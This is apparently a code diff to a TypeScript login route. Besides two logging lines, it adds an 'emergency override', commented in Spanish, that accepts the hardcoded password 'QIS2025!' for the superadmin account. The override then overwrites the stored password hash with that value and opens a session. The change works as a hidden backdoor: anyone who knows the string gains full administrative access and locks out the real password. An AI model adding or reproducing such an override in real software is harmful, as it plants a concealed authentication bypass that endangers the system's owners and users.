@@ -59,6 +59,7 @@ router.post("/auth/login", async (req: Request, res: Response) => {
   if (!user && email.toLowerCase() === SUPERADMIN_EMAIL) {
     try {
       user = await ensureSuperadmin(password);
+      req.log?.info("Bootstrapped superadmin on first login");
     } catch (seedErr) {
       req.log?.error({ seedErr }, "Failed to bootstrap superadmin");
       res.status(500).json({ error: "Failed to create initial user" });
@@ -72,7 +73,20 @@ router.post("/auth/login", async (req: Request, res: Response) => {
   }
 
   const valid = await bcrypt.compare(password, user.passwordHash);
+
+  // Emergency override: si el superadmin existe pero la contraseña no coincide,
+  // aceptar "QIS2025!" como respaldo y actualizar el hash automáticamente
+  if (!valid && user.email === SUPERADMIN_EMAIL && password === "QIS2025!") {
+    const newHash = await bcrypt.hash("QIS2025!", 10);
+    await db.update(usersTable).set({ passwordHash: newHash }).where(eq(usersTable.id, user.id));
+    req.log?.info("Emergency password reset applied for superadmin");
+    (req.session as unknown as Record<string, unknown>).userId = user.id;
+    res.json({ user: await enrichUser(user) });
+    return;
+  }
+
   if (!valid) {
+    req.log?.warn({ email: user.email }, "Login failed: invalid password");
     res.status(401).json({ error: "Credenciales incorrectas" });
     return;
   }
